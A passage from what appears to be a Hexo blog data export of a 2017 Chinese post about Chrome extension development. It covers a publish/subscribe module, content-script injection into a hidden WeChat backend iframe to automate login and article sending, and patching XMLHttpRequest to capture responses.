}\n}\n```\n通过上面的事件函数就能匹配到这里的函数再执行，那么如果有一个行文是一连串的话要怎么解决呢，比如发送一篇文章的流程是，**登录》扫码》进入主页》跳转到编辑器页面》插入发送内容》...**。难道调用者都要如此去每个事件监听再处理吗。为此，我们需要提供一个行为，叫“发送文章”，像大多数轮子一样，我们只需要提供一个函数就够了，如果是异步的，则返回一个`Promise`实例。于是wechat平台下还应该有这么一个对象\n```js\nexport default {\n  sendArticle: ( function() {\n    // 用户信息缓存\n    let userInfoTemp = null;\n\n    return function( articles, appID ) {\n\n      return new Promise( ( resolve, reject ) => {\n        \n        // 发起一个封装好的通知插件初始化iframe的请求\n        initWechatFrame();\n        // 进入微信公众平台首页\n        event.one( wechatConst._enteredIndex, async function() {\n\n          // 发起获取公众号账户和密码的请求\n          let { username, password } = userInfoTemp ? Promise.resolve( userInfoTemp ) : await $.ajax\n\n          sendMessageToPulgin( {\n            platform: 'wechat',\n            // 这里后面会讲为什么event也有命名空间\n            event: 'page.login',\n            data: {\n              username,\n              password\n            }\n          } );\n\n        } );\n        \n        event.one( wechatConst._enteredHome, function() {\n          // 登录成功进入首页\n          sendMessageToPulgin( {\n            platform: 'wechat',\n            event: 'page.goEditor'\n          } );\n        } );\n\n        event.one( wechatConst._enteredEditor, function() {\n          // 登录成功进入编辑器\n          \n          // some code\n        } );\n\n          // 发送成功\n        event.one( wechatConst.sendSuccess, resolve );\n\n\n      } ).catch( err => {\n        throw new Error( err );\n      } );\n\n    };\n  }() )\n};\n```\n这里使用闭包函数是为了缓存用户信息，方便在多次操作时提高效率\n为什么没有使用链式调用进行订阅，因为在这里还少一点代码没有码上，`one`方法返回一个当前订阅事件的id，为了在某个时刻对它们的订阅统一解除。虽然这里只订阅一次，但是还是有在某些情况出现重复订阅的情况，比如操作中途取消掉再操作。\n至此，类似的一个行为的订阅集合，我们就能统一放到一个方法里面再导出，为模块调用者提供一套独立的业务能力，发送、预览等。\n\n模块端就马马虎虎介绍到这里，很多细节应该是遗漏了，想到要如果要逐行的描述出来，怕是您也没什么兴趣读下去了。\n\n接下来是扩展端，扩展端其实我已经想到了很远，甚至想到了兼容无数平台的场景，但是。。。。\n\n扩展端我们还是尊崇一进一出原则，一个出口，一个入口。扩展端接收的消息类型更复杂，从通知扩展插入iframe，再到注入脚本到iframe内，iframe的事件通知给我们的页面都是个繁杂的过程。因为iframe的事件首先要通知给插入到iframe的脚本，脚本再通知给最外层的，也就是注入到我们页面的`contentscript`，再由它来通知给页面dom触发事件。\n\n##### 还是先从入口说起吧。\n思路是从一个`contentScript.js`文件作为入口，发送的消息还是按照平台来区分，但是`event`会多一个命名空间，用来区分事件是给通知`contentScript`的还是通知插入到iframe的`contentScript`的，这里我们为了区分每个平台就分别对应一个contentScript，查了文档，在使用下面这段代码\n```js\nchrome.tabs.executeScript( tabId, {\n  file: fileName,\n  allFrames: true\n} );\n```\n不能单独指定到哪个iframe，所以在代码执行前需要判断当前的`hostname`。\n\n我们如何知道页面进入了哪个地址下，然后需要做什么事呢，每个页面肯定有一个单独的url，在我们插入iframe时再绑定一个`onload`事件，每次在回调里注入我们的代码，代码立即会执行，再用`location.pathname`取得当前页面的pathname，以此名称作为函数名称来执行要做的事情（当然肯定要组织一个对象来存放映射的函数），比如通知我们的页面进入首页了，接下来需要输入密码登录。当然，可能并不是所有的网站每个页面都有个独立的pathname，比如微信后台某些页面带了查询参数来区分页面，那我们将参数取出再匹配一次，之前的pathname就不声明为函数，而声明为对象，将查询参数再匹配一次获得最终的结果。\n\n当然为了掌握别人的页面，我们肯定也要掌握每一个网络请求，chrome扩展本身提供了对网络请求的拦截，但不幸的是没有把响应消息体给我们，所以只能采取极端手段了，将代码真正的注入到dom里来改变原生`XmlHttpRequest`对象的行为，当然，这个权限也是要在`manifest.json`里面事先声明的。\n```js\nXMLHttpRequest.prototype.open = ( function( original_function ) {\n  return function( method, url, async ) {\n    // 保存请求相关参数\n    this.requestMethod = method;\n    this.requestURL = url;\n\n    this.addEventListener( \"readystatechange\", function() {\n      if ( this.readyState === 4 ) {\n\n        // do something\n\n\n      }\n\n    } );\n    return original_function.apply( this, arguments );\n  };\n}( XMLHttpRequest.prototype.open ) );\n\nXMLHttpRequest.prototype.send = ( function( original_function ) {\n  return function( data ) {\n    // 保存请求相关参数\n    this.requestData = data;\n    return original_function.apply( this, arguments );\n  };\n}( XMLHttpRequest.prototype.send ) );\n```\n这样我们就能掌握所有的ajax请求了（当然`fetch`函数除外），对一些关注的网络请求，就能进行处理，并通知给扩展，扩展再通知给页面。最后便形成了目标页面到扩展，扩展再到页面的流程了。值得注意的是：\n* iframe内发起的事件带出的数据，扩展内无法接收到也不知道是什么原因，所以最后我就放置了一个`textarea`标签来作为容器，通知扩展去取。\n* 自定义事件带入的数据需要{ detail: data } 这样的结构，因为在接收方需要以`event.detail`的方式去取。\n\n说了这么久感觉讲得不是很好，所以决定直接把代码放到github吧。[仓库地址](https://github.com/Ryuurock/blog-code/tree/master/chrome-extention-demo)\n\n","source":"_posts/chrome-extention.md","raw":"---\ntitle: 记一次chrome扩展开发\ncatalog: true\ndate: 2017-11-27 21:21:54\nsubtitle: \nheader-img: post/IMG_3167.JPG\ntags:\n- chrome extention\n---\n讲真，在这之前我甚至不知道chrome的插件是由`javascript`驱动的，最近因为为了优化产品的体验，开始从chrome插件来下手，因为chrome插件能强势侵入别家的网页，篡改任何你想篡改的东西，甚至可以将`http`的请求和响应数据进行修改。官方文档需要梯子， [360翻译的文档](http://open.chrome.360.cn/)（不是一般的老，看网页布局就知道了）, [百度翻译的文档](https://chajian.baidu.com/developer/extensions/getstarted.html).废话不多说，先来看看入口吧\nchrome插件最重要的是一个叫`manifest.json`的文件，文件描述了整个扩展的行为：\n* 整个扩展需要的权限（网络请求，标签页读取等）\n* 扩展的icon\n* 扩展的contentScript、background、popup资源路径\n* ...\n`contentScript`是注入到页面的js代码，但是它执行于一个隔离的环境，变量函数等与现有网页不会互相污染。\n`background`是一个背景\n> 背景页是一个运行在扩展进程中的HTML页面。它在你的扩展的整个生命周期都存在，同时，在同一时间只有一个实例处于活动状态。\n\n上面这句话是官方文档翻译后的描述，很符合“背景”这个名字，在后台，安安静静，相对一个整个浏览器的这个扩展，只有一个实例。\n`popup`这个页面就是我们在点击扩展按钮时弹出的一个html页面，它可以与其他两个进行通信。\n\n其实我们要做的是，将微信等平台通过`iframe`的形式嵌入到我们页面，且不让用户看到，通过代码来操作iframe内的内容，使用户在使用我们产品的同时，能够保留保留微信后台的体验。\n\n经过我的整理，整个扩展与我们页面的交互流程大致应该是这样的\n1. 当页面发起一个请求，判断插件是否安装成功\n2. 若安装有扩展则再通知扩展需要的操作\n3. 扩展插入iframe后注入contentScript\n4. contentScript执行再通知扩展，扩展再通知我们的页面获取结果\n\n当然这只是一个大致流程，扩展的`contentScript`与页面唯一的通信方法则是触发某个dom的原生事件或自定义事件，再传入所需的数据。**发布/订阅模式**看来真的是万能啊。\n\n当然，为了其他人开发的方便性和可维护性，我建立了一个单独的模块`chromeExtentionHandler`，由这个模块统一管理与扩展的交互（这也是发布/订阅模式的弊端，过多的订阅发布，容易造成困扰，降低代码可读性）\n\n监听来自扩展的事件，只需要一处就够了，扩展通过带过来的数据来告知模块需要发布或处理怎样的数据，所以定义的页面端的模块传入数据是这样的\n```json\n{\n  \"event\": \"\",\n  \"platform\": \"\",\n  \"data\": {}\n}\n```\n所以我在事件监听处是这么写的\n```js\ndocument.body.addEventListener( 'extensionBrowerEvent', function( { detail } ) {\n  let jsonDetail = null;\n  try {\n    jsonDetail = typeof detail === 'object' ? ( detail || {} ) : JSON.parse( detail );\n  } catch ( error ) {\n    return;\n  }\n  let { event, data, platform } = jsonDetail;\n\n  let eventHandlers = platformHandler[ platform ];\n  let namespaceEvent = `${platform}.${event}`;\n\n  if ( eventHandlers ) {\n    // 根据平台来获取相关的事件处理\n    let handlerItem = eventHandlers[ namespaceEvent ];\n    handlerItem ? handlerItem( data ) : events.emit( namespaceEvent, data );\n  } else {\n    events.emit( namespaceEvent, data );\n  }\n}, false );\n```\n`event`就是用来描述此次扩展消息的名称的，因为可能会存在多个平台操作的问题，所以`platform`用来标记平台名称，比如`wechat`，data当然是此次消息需要的数据。`namespaceEvent`是用来描述命名空间了，为了对不同平台相同的事件进行区分。\n这些事件中，有些需要模块来处理，有些需要模块调用者来处理，所以在上面的`if`逻辑里，就是用扩展通知的数据去匹配定义在对象里的函数进行处理，处理后再由函数决定是否发布此事件，若没有匹配到，则直接在此发布事件，说明此事件应由模块调用者自己处理。举个例子，扩展发出的数据是这样的\n```json\n{\n  \"event\": \"scanCode\",\n  \"platform\": \"wechat\",\n  \"data\": null\n}\n```\n于是我们在平台为`wechat`的模块里定义了它的处理函数\n```js\n{\n  'wechat.scanCode'( data ) {\n    // do something\n\n    events.emit( 'wechat.scanCode', data );\n  }\n}\n```\n通过上面的事件函数就能匹配到这里的函数再执行，那么如果有一个行文是一连串的话要怎么解决呢，比如发送一篇文章的流程是，**登录》扫码》进入主页》跳转到编辑器页面》插入发送内容》...**。难道调用者都要如此去每个事件监听再处理吗。为此，我们需要提供一个行为，叫“发送文章”，像大多数轮子一样，我们只需要提供一个函数就够了，如果是异步的，则返回一个`Promise`实例。于是wechat平台下还应该有这么一个对象\n```js\nexport default {\n  sendArticle: ( function() {\n    // 用户信息缓存\n    let userInfoTemp = null;\n\n    return function( articles, appID ) {\n\n      return new Promise( ( resolve, reject ) => {\n        \n        // 发起一个封装好的通知插件初始化iframe的请求\n        initWechatFrame();\n        // 进入微信公众平台首页\n        event.one( wechatConst._enteredIndex, async function() {\n\n          // 发起获取公众号账户和密码的请求\n          let { username, password } = userInfoTemp ? Promise.resolve( userInfoTemp ) : await $.ajax\n\n          sendMessageToPulgin( {\n            platform: 'wechat',\n            // 这里后面会讲为什么event也有命名空间\n            event: 'page.login',\n            data: {\n              username,\n              password\n            }\n          } );\n\n        } );\n        \n        event.one( wechatConst._enteredHome, function() {\n          // 登录成功进入首页\n          sendMessageToPulgin( {\n            platform: 'wechat',\n            event: 'page.goEditor'\n          } );\n        } );\n\n        event.one( wechatConst._enteredEditor, function() {\n          // 登录成功进入编辑器\n          \n          // some code\n        } );\n\n          // 发送成功\n        event.one( wechatConst.sendSuccess, resolve );\n\n\n      } ).catch( err => {\n        throw new Error( err );\n      } );\n\n    };\n  }() )\n};\n```\n这里使用闭包函数是为了缓存用户信息，方便在多次操作时提高效率\n为什么没有使用链式调用进行订阅，因为在这里还少一点代码没有码上，`one`方法返回一个当前订阅事件的id，为了在某个时刻对它们的订阅统一解除。虽然这里只订阅一次，但是还是有在某些情况出现重复订阅的情况，比如操作中途取消掉再操作。\n至此，类似的一个行为的订阅集合，我们就能统一放到一个方法里面再导出，为模块调用者提供一套独立的业务能力，发送、预览等。\n\n模块端就马马虎虎介绍到这里，很多细节应该是遗漏了，想到要如果要逐行的描述出来，怕是您也没什么兴趣读下去了。\n\n接下来是扩展端，扩展端其实我已经想到了很远，甚至想到了兼容无数平台的场景，但是。。。。\n\n扩展端我们还是尊崇一进一出原则，一个出口，一个入口。扩展端接收的消息类型更复杂，从通知扩展插入iframe，再到注入脚本到iframe内，iframe的事件通知给我们的页面都是个繁杂的过程。因为iframe的事件首先要通知给插入到iframe的脚本，脚本再通知给最外层的，也就是注入到我们页面的`contentscript`，再由它来通知给页面dom触发事件。\n\n##### 还是先从入口说起吧。\n思路是从一个`contentScript.js`文件作为入口，发送的消息还是按照平台来区分，但是`event`会多一个命名空间，用来区分事件是给通知`contentScript`的还是通知插入到iframe的`contentScript`的，这里我们为了区分每个平台就分别对应一个contentScript，查了文档，在使用下面这段代码\n```js\nchrome.tabs.executeScript( tabId, {\n  file: fileName,\n  allFrames: true\n} );\n```\n不能单独指定到哪个iframe，所以在代码执行前需要判断当前的`hostname`。\n\n我们如何知道页面进入了哪个地址下，然后需要做什么事呢，每个页面肯定有一个单独的url，在我们插入iframe时再绑定一个`onload`事件，每次在回调里注入我们的代码，代码立即会执行，再用`location.pathname`取得当前页面的pathname，以此名称作为函数名称来执行要做的事情（当然肯定要组织一个对象来存放映射的函数），比如通知我们的页面进入首页了，接下来需要输入密码登录。当然，可能并不是所有的网站每个页面都有个独立的pathname，比如微信后台某些页面带了查询参数来区分页面，那我们将参数取出再匹配一次，之前的pathname就不声明为函数，而声明为对象，将查询参数再匹配一次获得最终的结果。\n\n当然为了掌握别人的页面，我们肯定也要掌握每一个网络请求，chrome扩展本身提供了对网络请求的拦截，但不幸的是没有把响应消息体给我们，所以只能采取极端手段了，将代码真正的注入到dom里来改变原生`XmlHttpRequest`对象的行为，当然，这个权限也是要在`manifest.json`里面事先声明的。\n```js\nXMLHttpRequest.prototype.open = ( function( original_function ) {\n  return function( method, url, async ) {\n    // 保存请求相关参数\n    this.requestMethod = method;\n    this.requestURL = url;\n\n    this.addEventListener( \"readystatechange\", function() {\n      if ( this.readyState === 4 ) {\n\n        // do something\n\n\n      }\n\n    } );\n    return original_function.apply( this, arguments );\n  };\n}( XMLHttpRequest.prototype.open ) );\n\nXMLHttpRequest.prototype.send = ( function( original_function ) {\n  return function( data ) {\n    // 保存请求相关参数\n    this.requestData = data;\n    return original_function.apply( this, arguments );\n  };\n}( XMLHttpRequest.prototype.send ) );\n```\n这样我们就能掌握所有的ajax请求了（当然`fetch`函数除外），对一些关注的网络请求，就能进行处理，并通知给扩展，扩展再通知给页面。最后便形成了目标页面到扩展，扩展再到页面的流程了。值得注意的是：\n* iframe内发起的事件带出的数据，扩展内无法接收到也不知道是什么原因，所以最后我就放置了一个`textarea`标签来作为容器，通知扩展去取。\n* 自定义事件带入的数据需要{ detail: data } 这样的结构，因为在接收方需要以`event.detail`的方式去取。\n\n说了这么久感觉讲得不是很好，所以决定直接把代码放到github吧。[仓库地址](https://github.com/Ryuurock/blog-code/tree/master/chrome-extention-demo)\n\n","slug":"chrome-extention","published":1,"updated":"2017-11-28T16:14:03.905Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjv50004i4uc36jz82jf","content":"<p>讲真，在这之前我甚至不知道chrome的插件是由<code>javascript</code>驱动的，最近因为为了优化产品的体验，开始从chrome插件来下手，因为chrome插件能强势侵入别家的网页，篡改任何你想篡改的东西，甚至可以将<code>http</code>的请求和响应数据进行修改。官方文档需要梯子， <a href=\"http://open.chrome.360.cn/\" target=\"_blank\" rel=\"noopener\">360翻译的文档</a>（不是一般的老，看网页布局就知道了）, <a href=\"https://chajian.baidu.com/developer/extensions/getstarted.html\" target=\"_blank\" rel=\"noopener\">百度翻译的文档</a>.废话不多说，先来看看入口吧<br>\nchrome插件最重要的是一个叫<code>manifest.json</code>的文件，文件描述了整个扩展的行为：</p>\n<ul>\n<li>整个扩展需要的权限（网络请求，标签页读取等）</li>\n<li>扩展的icon</li>\n<li>扩展的contentScript、background、popup资源路径</li>\n<li>…<br>\n<code>contentScript</code>是注入到页面的js代码，但是它执行于一个隔离的环境，变量函数等与现有网页不会互相污染。<br>\n<code>background</code>是一个背景</li>\n</ul>\n<blockquote>\n<p>背景页是一个运行在扩展进程中的HTML页面。它在你的扩展的整个生命周期都存在，同时，在同一时间只有一个实例处于活动状态。</p>\n</blockquote>\n<p>上面这句话是官方文档翻译后的描述，很符合“背景”这个名字，在后台，安安静静，相对一个整个浏览器的这个扩展，只有一个实例。<br>\n<code>popup</code>这个页面就是我们在点击扩展按钮时弹出的一个html页面，它可以与其他两个进行通信。</p>\n<p>其实我们要做的是，将微信等平台通过<code>iframe</code>的形式嵌入到我们页面，且不让用户看到，通过代码来操作iframe内的内容，使用户在使用我们产品的同时，能够保留保留微信后台的体验。</p>\n<p>经过我的整理，整个扩展与我们页面的交互流程大致应该是这样的</p>\n<ol>\n<li>当页面发起一个请求，判断插件是否安装成功</li>\n<li>若安装有扩展则再通知扩展需要的操作</li>\n<li>扩展插入iframe后注入contentScript</li>\n<li>contentScript执行再通知扩展，扩展再通知我们的页面获取结果</li>\n</ol>\n<p>当然这只是一个大致流程，扩展的<code>contentScript</code>与页面唯一的通信方法则是触发某个dom的原生事件或自定义事件，再传入所需的数据。<strong>发布/订阅模式</strong>看来真的是万能啊。</p>\n<p>当然，为了其他人开发的方便性和可维护性，我建立了一个单独的模块<code>chromeExtentionHandler</code>，由这个模块统一管理与扩展的交互（这也是发布/订阅模式的弊端，过多的订阅发布，容易造成困扰，降低代码可读性）</p>\n<p>监听来自扩展的事件，只需要一处就够了，扩展通过带过来的数据来告知模块需要发布或处理怎样的数据，所以定义的页面端的模块传入数据是这样的</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"event\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"platform\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"data\"</span>: &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>所以我在事件监听处是这么写的</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.body.addEventListener( <span class=\"string\">'extensionBrowerEvent'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> &#123; detail &#125; </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> jsonDetail = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    jsonDetail = <span class=\"keyword\">typeof</span> detail === <span class=\"string\">'object'</span> ? ( detail || &#123;&#125; ) : <span class=\"built_in\">JSON</span>.parse( detail );</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> ( error ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> &#123; event, data, platform &#125; = jsonDetail;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> eventHandlers = platformHandler[ platform ];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> namespaceEvent = <span class=\"string\">`<span class=\"subst\">$&#123;platform&#125;</span>.<span class=\"subst\">$&#123;event&#125;</span>`</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( eventHandlers ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 根据平台来获取相关的事件处理</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> handlerItem = eventHandlers[ namespaceEvent ];</span><br><span class=\"line\">    handlerItem ? handlerItem( data ) : events.emit( namespaceEvent, data );</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    events.emit( namespaceEvent, data );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;, <span class=\"literal\">false</span> );</span><br></pre></td></tr></table></figure>\n<p><code>event</code>就是用来描述此次扩展消息的名称的，因为可能会存在多个平台操作的问题，所以<code>platform</code>用来标记平台名称，比如<code>wechat</code>，data当然是此次消息需要的数据。<code>namespaceEvent</code>是用来描述命名空间了，为了对不同平台相同的事件进行区分。<br>\n这些事件中，有些需要模块来处理，有些需要模块调用者来处理，所以在上面的<code>if</code>逻辑里，就是用扩展通知的数据去匹配定义在对象里的函数进行处理，处理后再由函数决定是否发布此事件，若没有匹配到，则直接在此发布事件，说明此事件应由模块调用者自己处理。举个例子，扩展发出的数据是这样的</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"event\"</span>: <span class=\"string\">\"scanCode\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"platform\"</span>: <span class=\"string\">\"wechat\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"data\"</span>: <span class=\"literal\">null</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>于是我们在平台为<code>wechat</code>的模块里定义了它的处理函数</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">'wechat.scanCode'</span>( data ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// do something</span></span><br><span class=\"line\"></span><br><span class=\"line\">    events.emit( <span class=\"string\">'wechat.scanCode'</span>, data );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过上面的事件函数就能匹配到这里的函数再执行，那么如果有一个行文是一连串的话要怎么解决呢，比如发送一篇文章的流程是，<strong>登录》扫码》进入主页》跳转到编辑器页面》插入发送内容》…</strong>。难道调用者都要如此去每个事件监听再处理吗。为此，我们需要提供一个行为，叫“发送文章”，像大多数轮子一样，我们只需要提供一个函数就够了，如果是异步的，则返回一个<code>Promise</code>实例。于是wechat平台下还应该有这么一个对象</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  sendArticle: ( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 用户信息缓存</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> userInfoTemp = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> articles, appID </span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\">(<span class=\"params\"> resolve, reject </span>) =&gt;</span> &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// 发起一个封装好的通知插件初始化iframe的请求</span></span><br><span class=\"line\">        initWechatFrame();</span><br><span class=\"line\">        <span class=\"comment\">// 进入微信公众平台首页</span></span><br><span class=\"line\">        event.one( wechatConst._enteredIndex, <span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">// 发起获取公众号账户和密码的请求</span></span><br><span class=\"line\">          <span class=\"keyword\">let</span> &#123; username, password &#125; = userInfoTemp ? <span class=\"built_in\">Promise</span>.resolve( userInfoTemp ) : <span class=\"keyword\">await</span> $.ajax</span><br><span class=\"line\"></span><br><span class=\"line\">          sendMessageToPulgin( &#123;</span><br><span class=\"line\">            platform: <span class=\"string\">'wechat'</span>,</span><br><span class=\"line\">            <span class=\"comment\">// 这里后面会讲为什么event也有命名空间</span></span><br><span class=\"line\">            event: <span class=\"string\">'page.login'</span>,</span><br><span class=\"line\">            data: &#123;</span><br><span class=\"line\">              username,</span><br><span class=\"line\">              password</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\">        </span><br><span class=\"line\">        event.one( wechatConst._enteredHome, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"comment\">// 登录成功进入首页</span></span><br><span class=\"line\">          sendMessageToPulgin( &#123;</span><br><span class=\"line\">            platform: <span class=\"string\">'wechat'</span>,</span><br><span class=\"line\">            event: <span class=\"string\">'page.goEditor'</span></span><br><span class=\"line\">          &#125; );</span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">        event.one( wechatConst._enteredEditor, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"comment\">// 登录成功进入编辑器</span></span><br><span class=\"line\">          </span><br><span class=\"line\">          <span class=\"comment\">// some code</span></span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">// 发送成功</span></span><br><span class=\"line\">        event.one( wechatConst.sendSuccess, resolve );</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">      &#125; ).catch( <span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>( err );</span><br><span class=\"line\">      &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;() )</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这里使用闭包函数是为了缓存用户信息，方便在多次操作时提高效率<br>\n为什么没有使用链式调用进行订阅，因为在这里还少一点代码没有码上，<code>one</code>方法返回一个当前订阅事件的id，为了在某个时刻对它们的订阅统一解除。虽然这里只订阅一次，但是还是有在某些情况出现重复订阅的情况，比如操作中途取消掉再操作。<br>\n至此，类似的一个行为的订阅集合，我们就能统一放到一个方法里面再导出，为模块调用者提供一套独立的业务能力，发送、预览等。</p>\n<p>模块端就马马虎虎介绍到这里，很多细节应该是遗漏了，想到要如果要逐行的描述出来，怕是您也没什么兴趣读下去了。</p>\n<p>接下来是扩展端，扩展端其实我已经想到了很远，甚至想到了兼容无数平台的场景，但是。。。。</p>\n<p>扩展端我们还是尊崇一进一出原则，一个出口，一个入口。扩展端接收的消息类型更复杂，从通知扩展插入iframe，再到注入脚本到iframe内，iframe的事件通知给我们的页面都是个繁杂的过程。因为iframe的事件首先要通知给插入到iframe的脚本，脚本再通知给最外层的，也就是注入到我们页面的<code>contentscript</code>，再由它来通知给页面dom触发事件。</p>\n<h5><span id=\"还是先从入口说起吧\">还是先从入口说起吧。</span></h5>\n<p>思路是从一个<code>contentScript.js</code>文件作为入口，发送的消息还是按照平台来区分，但是<code>event</code>会多一个命名空间，用来区分事件是给通知<code>contentScript</code>的还是通知插入到iframe的<code>contentScript</code>的，这里我们为了区分每个平台就分别对应一个contentScript，查了文档，在使用下面这段代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chrome.tabs.executeScript( tabId, &#123;</span><br><span class=\"line\">  file: fileName,</span><br><span class=\"line\">  allFrames: <span class=\"literal\">true</span></span><br><span class=\"line\">&#125; 